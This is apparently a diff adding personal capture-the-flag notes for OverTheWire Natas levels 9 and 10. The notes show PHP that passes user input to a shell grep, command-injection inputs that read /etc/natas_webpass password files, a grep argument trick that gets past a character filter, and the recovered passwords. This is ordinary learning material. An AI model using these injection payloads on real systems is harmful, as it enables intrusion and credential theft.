@@ -232,4 +232,83 @@ Access granted. The password for natas9 is W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl
 natas9
 ######
 
+Page reads
+Find words containing:
+With a link to source code
 
+Output:
+<pre>
+<?
+$key = "";
+
+if(array_key_exists("needle", $_REQUEST)) {
+    $key = $_REQUEST["needle"];
+}
+
+if($key != "") {
+    passthru("grep -i $key dictionary.txt");
+}
+?>
+
+This seems SQL-injectiony
+inputting joiewajfoajea || ls outputs dictionary.txt
+
+OverTheWire tells us that passwords are stored in /etc/natas_webpass/{level}
+We want the password for natas10
+Input: zzz || cat /etc/natas_webpass/natas10
+nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu
+
+Note: we can also use a semicolon to pass commands, i.e.,
+foo; cat /etc/natas_webpass/natas10
+nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu
+
+#######
+natas10
+#######
+Similar to 9, but now says: For security reasons, we now filter on certain characters || input says there is an illegal character.  Fortunately there is a source code link.  
+Output:
+<pre>
+<?
+$key = "";
+
+if(array_key_exists("needle", $_REQUEST)) {
+    $key = $_REQUEST["needle"];
+}
+
+if($key != "") {
+    if(preg_match('/[;|&]/',$key)) {
+        print "Input contains an illegal character!";
+    } else {
+        passthru("grep -i $key dictionary.txt");
+    }
+}
+?>
+
+Looks like we cannot insert / ; | & characters.
+Can we exploit the line grep -i $key dictionary.txt?
+
+The command reads grep $key (case-insensitive) at dictionary.txt
+grep is likely in /bin/grep or /usr/bin/grep (from whereis grep)
+grep can search multiple files
+
+We can ask grep to search multiple files for a string
+foo /etc/natas_webpass/natas11
+searches the natas11 password file and outputs a match.
+If we use a single letter we should find a match
+
+a /etc/natas_webpass/natas11
+Only dictionary.txt output
+
+c /etc/natas_webpass/natas11
+Output:
+
+/etc/natas_webpass/natas11:U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK
+dictionary.txt:African
+dictionary.txt:Africans
+dictionary.txt:American
+
+U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK
+
+#######
+natas11
+#######
